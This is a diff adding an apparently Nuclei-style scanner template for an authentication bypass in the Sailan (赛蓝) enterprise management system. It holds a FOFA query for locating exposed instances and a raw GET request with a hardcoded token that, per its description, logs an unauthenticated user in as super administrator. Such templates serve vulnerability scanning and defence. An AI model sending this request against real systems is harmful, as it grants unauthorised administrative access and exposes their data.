@@ -1,0 +1,33 @@
+id: sailan-AuthToken_Index-Authentication-bypass
+
+info:
+  name: 赛蓝企业管理系统 AuthToken/Index 身份认证绕过漏洞
+  author: unknown
+  severity: high
+  description: |-
+    fofa: body="/Home6/AdminPretty"
+    赛蓝企业管理系统 AuthToken/Index 接口存在身份认证绕过漏洞，未授权的远程攻击者可以利用此接口构造token绕过身份认证，使用超级管理员账户登录系统后台，造成信息泄露或者恶意破坏，使系统处于极不安全的状态。
+
+  tags: Authentication bypass
+  
+
+http:
+  - raw:
+      - |
+        GET /AuthToken/Index?loginName=System&token=c94ad0c0aee8b1f23b138484f014131f HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '/Home6/AdminPretty'
+      - type: status
+        status: 
+          - 302
+
+
+
+
+
